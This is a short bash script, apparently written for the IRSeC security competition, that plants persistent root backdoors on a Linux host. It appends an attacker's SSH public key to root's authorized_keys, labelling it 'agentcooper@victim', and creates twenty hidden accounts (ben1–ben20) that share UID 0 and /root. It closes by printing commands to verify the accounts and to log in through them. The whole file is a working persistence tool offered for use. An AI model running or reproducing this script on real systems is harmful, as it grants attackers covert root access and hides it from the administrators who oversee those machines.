#!/usr/bin/env bash
# IRSeC - Ghost User Farm (Ben Edition)
# Creates 20 UID 0 accounts (ben1-ben20) and configures SSH key auth for 'agentcooper'.
# Run as root.

set -uo pipefail

# 1. Configuration
GHOST_COUNT=20
SHELL="/bin/bash"
HOME_DIR="/root"
GROUP="root"
ATTACKER_IDENT="agentcooper"
SSH_DIR="/root/.ssh"
AUTH_KEYS="$SSH_DIR/authorized_keys"

# 2. Check for root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

# 3. Ensure SSH directory and authorized_keys exist
mkdir -p "$SSH_DIR"
chmod 700 "$SSH_DIR"
[[ -f "$AUTH_KEYS" ]] || touch "$AUTH_KEYS"
chmod 600 "$AUTH_KEYS"

# 4. Check if attacker key is already present
if grep -q "$ATTACKER_IDENT" "$AUTH_KEYS" 2>/dev/null; then
    echo "[INFO] Attacker key for '$ATTACKER_IDENT' already present in authorized_keys."
else
    echo "[WARN] Attacker key for '$ATTACKER_IDENT' not found in $AUTH_KEYS."
    echo "       Please ensure your public key is added before running this script,"
    echo "       or paste your public key below when prompted."
    read -p "Paste your public key (ssh-ed25519 ...): " ATTACKER_KEY
    if [[ -n "$ATTACKER_KEY" ]]; then
        echo "$ATTACKER_KEY $ATTACKER_IDENT@victim" >> "$AUTH_KEYS"
        echo "[OK] Attacker key added to $AUTH_KEYS."
    else
        echo "[ERROR] No key provided. Skipping SSH setup."
    fi
fi

# 5. Create the 20 ghost users
echo "Starting Ghost User Farm (ben1-ben20)..."
echo "----------------------------------------"

for ((i=1; i<=GHOST_COUNT; i++)); do
    name="ben$i"
    
    # Check if user already exists
    if id "$name" &>/dev/null; then
        echo "[SKIP] $name already exists."
        continue
    fi

    # Create the user
    # -o: Non-unique UID
    # -u 0: UID 0
    # -g 0: GID 0 (root)
    # -G 0: Supplementary group root
    # -d: Home directory (/root)
    # -s: Shell
    # -M: Do not create home directory
    # -c: Comment
    if useradd -o -u 0 -g 0 -G 0 -d "$HOME_DIR" -s "$SHELL" -M -c "Ben $i" "$name"; then
        echo "[CREATED] $name (UID 0)"
    else
        echo "[FAIL] Could not create $name"
    fi
done

echo "----------------------------------------"
echo "Ghost User Farm Complete."
echo "Verify with: awk -F: '\$3 == 0 && \$1 ~ /^ben[0-9]+$/ {print \$1}' /etc/passwd"
echo "SSH in as any ghost user: ssh -i your_key agentcooper@victim-host -o User=ben1"
